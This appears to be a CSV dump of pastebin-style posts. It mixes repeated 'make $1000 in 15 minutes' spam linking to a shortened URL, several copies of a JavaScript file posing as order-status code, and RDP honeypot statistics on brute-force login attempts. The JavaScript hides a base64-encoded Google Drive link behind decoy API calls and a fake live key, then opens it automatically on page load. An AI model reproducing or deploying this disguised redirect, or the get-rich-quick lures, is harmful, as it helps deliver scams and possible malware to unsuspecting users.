id,title,username,language,date,content
HFahBHSs,Make $1000 15-MINUTES  (BEGINNER) HV,Fareswww511,JavaScript,Wednesday 16th of April 2025 07:20:09 PM CDT," 
Pdf https://tinyurl.com/privguidee


imHT0oi63o
"
zPP7StAM,Products.js,jm33,JavaScript,Wednesday 16th of April 2025 07:18:24 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24301/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
z6D3U676,2025-04-15_stats.json,rdp_snitch,JSON,Wednesday 16th of April 2025 07:18:15 PM CDT,"{
  ""ip"": {
    ""222.100.239.9"": 453,
    ""156.146.57.47"": 5064,
    ""80.94.95.198"": 30,
    ""211.185.207.14"": 33,
    ""194.165.17.21"": 63,
    ""58.218.199.219"": 3,
    ""167.94.145.96"": 3,
    ""71.82.170.60"": 51,
    ""198.235.24.56"": 9,
    ""80.94.95.90"": 12,
    ""194.180.49.123"": 3,
    ""92.255.85.59"": 6,
    ""147.185.132.99"": 9,
    ""101.36.97.70"": 3,
    ""157.245.104.150"": 3,
    ""91.238.181.95"": 6,
    ""88.214.25.121"": 6,
    ""112.220.69.148"": 3,
    ""80.66.79.30"": 3,
    ""150.95.30.49"": 3,
    ""156.146.57.181"": 2304,
    ""198.235.24.79"": 9,
    ""165.154.163.199"": 3,
    ""92.255.57.11"": 9,
    ""205.210.31.234"": 9,
    ""194.187.176.78"": 3
  },
  ""asn"": {
    ""AS4766"": 486,
    ""AS212238"": 7368,
    ""AS204428"": 42,
    ""AS48721"": 63,
    ""AS4134"": 3,
    ""AS398705"": 3,
    ""AS20115"": 51,
    ""AS396982"": 36,
    ""AS201814"": 3,
    ""AS207566"": 15,
    ""AS135377"": 6,
    ""AS14061"": 3,
    ""AS49434"": 6,
    ""AS35042"": 6,
    ""AS3786"": 3,
    ""AS60602"": 3,
    ""AS135161"": 3,
    ""AS208843"": 3
  },
  ""isp"": {
    ""Korea Telecom"": 486,
    ""Datacamp Limited"": 7368,
    ""SS-Net"": 42,
    ""Flyservers S.A."": 63,
    ""Chinanet"": 3,
    ""Censys, Inc."": 3,
    ""Charter Communications"": 51,
    ""Google LLC"": 36,
    ""MEVSPACE sp. z o.o."": 3,
    ""Chang Way Technologies Co. Limited"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""DigitalOcean, LLC"": 3,
    ""Datacenter location PAR1 France"": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""LG DACOM Corporation"": 3,
    ""HYPER-HOSTING"": 3,
    ""GMO-Z.COM PTE. LTD."": 3,
    ""Alpha Strike Labs GmbH"": 3
  },
  ""org"": {
    ""Kornet"": 486,
    ""Datacamp Limited"": 7368,
    ""Unmanaged LTD"": 42,
    ""Flyservers S.A"": 63,
    ""Chinanet JS"": 3,
    ""Censys, Inc."": 3,
    ""Spectrum"": 51,
    ""Palo Alto Networks, Inc"": 36,
    ""HostSlick"": 3,
    ""Chang Way Technologies Co. Limited"": 15,
    ""Ucloud Information Technology"": 6,
    ""DigitalOcean, LLC"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""LG Uplus"": 3,
    ""Hyper Hosting SRL"": 3,
    ""Zcom Thai"": 3,
    ""Alpha Strike Labs GmbH"": 3
  },
  ""regionName"": {
    ""Incheon"": 453,
    ""North West"": 7368,
    ""Budapest"": 42,
    ""Sejong-si"": 33,
    ""Kaunas"": 63,
    ""Jiangsu"": 3,
    ""Michigan"": 3,
    ""Wisconsin"": 51,
    ""California"": 39,
    ""Bavaria"": 3,
    ""Moscow"": 15,
    ""England"": 3,
    ""Karnataka"": 3,
    ""\u00cele-de-France"": 6,
    ""Kowloon City"": 6,
    ""Daegu"": 3,
    ""Chi\u0219in\u0103u Municipality"": 3,
    ""Bangkok"": 3,
    ""State of Berlin"": 3
  },
  ""country"": {
    ""South Korea"": 489,
    ""Singapore"": 7368,
    ""Hungary"": 42,
    ""Lithuania"": 63,
    ""China"": 3,
    ""United States"": 93,
    ""Germany"": 6,
    ""Russia"": 15,
    ""United Kingdom"": 3,
    ""India"": 3,
    ""France"": 6,
    ""Hong Kong"": 6,
    ""Moldova"": 3,
    ""Thailand"": 3
  },
  ""account"": {
    ""hello"": 7839,
    ""142.93.8.59"": 177,
    ""(empty)"": 3,
    ""kPDFXKcqY"": 3,
    ""eHQPRO"": 3,
    ""IxZpHA"": 3,
    ""Administr"": 27,
    ""ZowCwKysJ"": 3,
    ""mFvdGe"": 3,
    ""JIrbro"": 3,
    ""Administrator"": 6,
    ""Test"": 12,
    ""pDtLpgsRc"": 3,
    ""eQuQcP"": 3,
    ""fwSEFs"": 3,
    ""MonbwLjLu"": 3,
    ""iSDeFN"": 3,
    ""xGQvYq"": 3,
    ""user"": 3
  },
  ""keyboard"": {
    ""Unknown"": 8103
  },
  ""client_build"": {
    ""Unknown"": 8103
  },
  ""client_name"": {
    ""Unknown"": 8103
  },
  ""ip_type"": {
    ""Unknown"": 660,
    ""hosting & proxy"": 7371,
    ""proxy"": 18,
    ""hosting"": 54
  }
}"
eBM4Ac2a,2025-04-15_stats.json,rdp_snitch,JSON,Wednesday 16th of April 2025 07:16:18 PM CDT,"{
  ""ip"": {
    ""222.100.239.9"": 452,
    ""156.146.57.47"": 5064,
    ""80.94.95.198"": 30,
    ""211.185.207.14"": 33,
    ""194.165.17.21"": 63,
    ""58.218.199.219"": 3,
    ""167.94.145.96"": 3,
    ""71.82.170.60"": 51,
    ""198.235.24.56"": 9,
    ""80.94.95.90"": 12,
    ""194.180.49.123"": 3,
    ""92.255.85.59"": 6,
    ""147.185.132.99"": 9,
    ""101.36.97.70"": 3,
    ""157.245.104.150"": 3,
    ""91.238.181.95"": 6,
    ""88.214.25.121"": 6,
    ""112.220.69.148"": 3,
    ""80.66.79.30"": 3,
    ""150.95.30.49"": 3,
    ""156.146.57.181"": 2304,
    ""198.235.24.79"": 9,
    ""165.154.163.199"": 3,
    ""92.255.57.11"": 9,
    ""205.210.31.234"": 9,
    ""194.187.176.78"": 3
  },
  ""asn"": {
    ""AS4766"": 485,
    ""AS212238"": 7368,
    ""AS204428"": 42,
    ""AS48721"": 63,
    ""AS4134"": 3,
    ""AS398705"": 3,
    ""AS20115"": 51,
    ""AS396982"": 36,
    ""AS201814"": 3,
    ""AS207566"": 15,
    ""AS135377"": 6,
    ""AS14061"": 3,
    ""AS49434"": 6,
    ""AS35042"": 6,
    ""AS3786"": 3,
    ""AS60602"": 3,
    ""AS135161"": 3,
    ""AS208843"": 3
  },
  ""isp"": {
    ""Korea Telecom"": 485,
    ""Datacamp Limited"": 7368,
    ""SS-Net"": 42,
    ""Flyservers S.A."": 63,
    ""Chinanet"": 3,
    ""Censys, Inc."": 3,
    ""Charter Communications"": 51,
    ""Google LLC"": 36,
    ""MEVSPACE sp. z o.o."": 3,
    ""Chang Way Technologies Co. Limited"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""DigitalOcean, LLC"": 3,
    ""Datacenter location PAR1 France"": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""LG DACOM Corporation"": 3,
    ""HYPER-HOSTING"": 3,
    ""GMO-Z.COM PTE. LTD."": 3,
    ""Alpha Strike Labs GmbH"": 3
  },
  ""org"": {
    ""Kornet"": 485,
    ""Datacamp Limited"": 7368,
    ""Unmanaged LTD"": 42,
    ""Flyservers S.A"": 63,
    ""Chinanet JS"": 3,
    ""Censys, Inc."": 3,
    ""Spectrum"": 51,
    ""Palo Alto Networks, Inc"": 36,
    ""HostSlick"": 3,
    ""Chang Way Technologies Co. Limited"": 15,
    ""Ucloud Information Technology"": 6,
    ""DigitalOcean, LLC"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""LG Uplus"": 3,
    ""Hyper Hosting SRL"": 3,
    ""Zcom Thai"": 3,
    ""Alpha Strike Labs GmbH"": 3
  },
  ""regionName"": {
    ""Incheon"": 452,
    ""North West"": 7368,
    ""Budapest"": 42,
    ""Sejong-si"": 33,
    ""Kaunas"": 63,
    ""Jiangsu"": 3,
    ""Michigan"": 3,
    ""Wisconsin"": 51,
    ""California"": 39,
    ""Bavaria"": 3,
    ""Moscow"": 15,
    ""England"": 3,
    ""Karnataka"": 3,
    ""\u00cele-de-France"": 6,
    ""Kowloon City"": 6,
    ""Daegu"": 3,
    ""Chi\u0219in\u0103u Municipality"": 3,
    ""Bangkok"": 3,
    ""State of Berlin"": 3
  },
  ""country"": {
    ""South Korea"": 488,
    ""Singapore"": 7368,
    ""Hungary"": 42,
    ""Lithuania"": 63,
    ""China"": 3,
    ""United States"": 93,
    ""Germany"": 6,
    ""Russia"": 15,
    ""United Kingdom"": 3,
    ""India"": 3,
    ""France"": 6,
    ""Hong Kong"": 6,
    ""Moldova"": 3,
    ""Thailand"": 3
  },
  ""account"": {
    ""hello"": 7838,
    ""142.93.8.59"": 177,
    ""(empty)"": 3,
    ""kPDFXKcqY"": 3,
    ""eHQPRO"": 3,
    ""IxZpHA"": 3,
    ""Administr"": 27,
    ""ZowCwKysJ"": 3,
    ""mFvdGe"": 3,
    ""JIrbro"": 3,
    ""Administrator"": 6,
    ""Test"": 12,
    ""pDtLpgsRc"": 3,
    ""eQuQcP"": 3,
    ""fwSEFs"": 3,
    ""MonbwLjLu"": 3,
    ""iSDeFN"": 3,
    ""xGQvYq"": 3,
    ""user"": 3
  },
  ""keyboard"": {
    ""Unknown"": 8102
  },
  ""client_build"": {
    ""Unknown"": 8102
  },
  ""client_name"": {
    ""Unknown"": 8102
  },
  ""ip_type"": {
    ""Unknown"": 659,
    ""hosting & proxy"": 7371,
    ""proxy"": 18,
    ""hosting"": 54
  }
}"
FFA19xba,2025-04-15_stats.json,rdp_snitch,JSON,Wednesday 16th of April 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""222.100.239.9"": 451,
    ""156.146.57.47"": 5064,
    ""80.94.95.198"": 30,
    ""211.185.207.14"": 33,
    ""194.165.17.21"": 63,
    ""58.218.199.219"": 3,
    ""167.94.145.96"": 3,
    ""71.82.170.60"": 51,
    ""198.235.24.56"": 9,
    ""80.94.95.90"": 12,
    ""194.180.49.123"": 3,
    ""92.255.85.59"": 6,
    ""147.185.132.99"": 9,
    ""101.36.97.70"": 3,
    ""157.245.104.150"": 3,
    ""91.238.181.95"": 6,
    ""88.214.25.121"": 6,
    ""112.220.69.148"": 3,
    ""80.66.79.30"": 3,
    ""150.95.30.49"": 3,
    ""156.146.57.181"": 2304,
    ""198.235.24.79"": 9,
    ""165.154.163.199"": 3,
    ""92.255.57.11"": 9,
    ""205.210.31.234"": 9,
    ""194.187.176.78"": 3
  },
  ""asn"": {
    ""AS4766"": 484,
    ""AS212238"": 7368,
    ""AS204428"": 42,
    ""AS48721"": 63,
    ""AS4134"": 3,
    ""AS398705"": 3,
    ""AS20115"": 51,
    ""AS396982"": 36,
    ""AS201814"": 3,
    ""AS207566"": 15,
    ""AS135377"": 6,
    ""AS14061"": 3,
    ""AS49434"": 6,
    ""AS35042"": 6,
    ""AS3786"": 3,
    ""AS60602"": 3,
    ""AS135161"": 3,
    ""AS208843"": 3
  },
  ""isp"": {
    ""Korea Telecom"": 484,
    ""Datacamp Limited"": 7368,
    ""SS-Net"": 42,
    ""Flyservers S.A."": 63,
    ""Chinanet"": 3,
    ""Censys, Inc."": 3,
    ""Charter Communications"": 51,
    ""Google LLC"": 36,
    ""MEVSPACE sp. z o.o."": 3,
    ""Chang Way Technologies Co. Limited"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""DigitalOcean, LLC"": 3,
    ""Datacenter location PAR1 France"": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""LG DACOM Corporation"": 3,
    ""HYPER-HOSTING"": 3,
    ""GMO-Z.COM PTE. LTD."": 3,
    ""Alpha Strike Labs GmbH"": 3
  },
  ""org"": {
    ""Kornet"": 484,
    ""Datacamp Limited"": 7368,
    ""Unmanaged LTD"": 42,
    ""Flyservers S.A"": 63,
    ""Chinanet JS"": 3,
    ""Censys, Inc."": 3,
    ""Spectrum"": 51,
    ""Palo Alto Networks, Inc"": 36,
    ""HostSlick"": 3,
    ""Chang Way Technologies Co. Limited"": 15,
    ""Ucloud Information Technology"": 6,
    ""DigitalOcean, LLC"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""LG Uplus"": 3,
    ""Hyper Hosting SRL"": 3,
    ""Zcom Thai"": 3,
    ""Alpha Strike Labs GmbH"": 3
  },
  ""regionName"": {
    ""Incheon"": 451,
    ""North West"": 7368,
    ""Budapest"": 42,
    ""Sejong-si"": 33,
    ""Kaunas"": 63,
    ""Jiangsu"": 3,
    ""Michigan"": 3,
    ""Wisconsin"": 51,
    ""California"": 39,
    ""Bavaria"": 3,
    ""Moscow"": 15,
    ""England"": 3,
    ""Karnataka"": 3,
    ""\u00cele-de-France"": 6,
    ""Kowloon City"": 6,
    ""Daegu"": 3,
    ""Chi\u0219in\u0103u Municipality"": 3,
    ""Bangkok"": 3,
    ""State of Berlin"": 3
  },
  ""country"": {
    ""South Korea"": 487,
    ""Singapore"": 7368,
    ""Hungary"": 42,
    ""Lithuania"": 63,
    ""China"": 3,
    ""United States"": 93,
    ""Germany"": 6,
    ""Russia"": 15,
    ""United Kingdom"": 3,
    ""India"": 3,
    ""France"": 6,
    ""Hong Kong"": 6,
    ""Moldova"": 3,
    ""Thailand"": 3
  },
  ""account"": {
    ""hello"": 7837,
    ""142.93.8.59"": 177,
    ""(empty)"": 3,
    ""kPDFXKcqY"": 3,
    ""eHQPRO"": 3,
    ""IxZpHA"": 3,
    ""Administr"": 27,
    ""ZowCwKysJ"": 3,
    ""mFvdGe"": 3,
    ""JIrbro"": 3,
    ""Administrator"": 6,
    ""Test"": 12,
    ""pDtLpgsRc"": 3,
    ""eQuQcP"": 3,
    ""fwSEFs"": 3,
    ""MonbwLjLu"": 3,
    ""iSDeFN"": 3,
    ""xGQvYq"": 3,
    ""user"": 3
  },
  ""keyboard"": {
    ""Unknown"": 8101
  },
  ""client_build"": {
    ""Unknown"": 8101
  },
  ""client_name"": {
    ""Unknown"": 8101
  },
  ""ip_type"": {
    ""Unknown"": 658,
    ""hosting & proxy"": 7371,
    ""proxy"": 18,
    ""hosting"": 54
  }
}"
b0ktqQ5e,EARN $900 INSTANTLY 2025 2U,Fareswww511,JavaScript,Wednesday 16th of April 2025 07:06:43 PM CDT," 
Pdf https://tinyurl.com/privguidee


6DB6jQzzfp
"
LXiVTXkz,Order.js,jm33,JavaScript,Wednesday 16th of April 2025 07:03:01 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/87882/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pPhayjbK,Make $1000 15-MINUTES (BEGINNER) FM,Fareswww511,JavaScript,Wednesday 16th of April 2025 06:53:19 PM CDT," 
Pdf https://tinyurl.com/privguidee


iYvLvDRKup
"
yfHCQkCW,Market.js,jm33,JavaScript,Wednesday 16th of April 2025 06:47:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/39964/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
EDGQNJgP,EARN $900 INSTANTLY 2025⭐ G8,Fareswww511,JavaScript,Wednesday 16th of April 2025 06:39:52 PM CDT," 
Pdf https://tinyurl.com/privguidee


uOEQmKoMP6
"
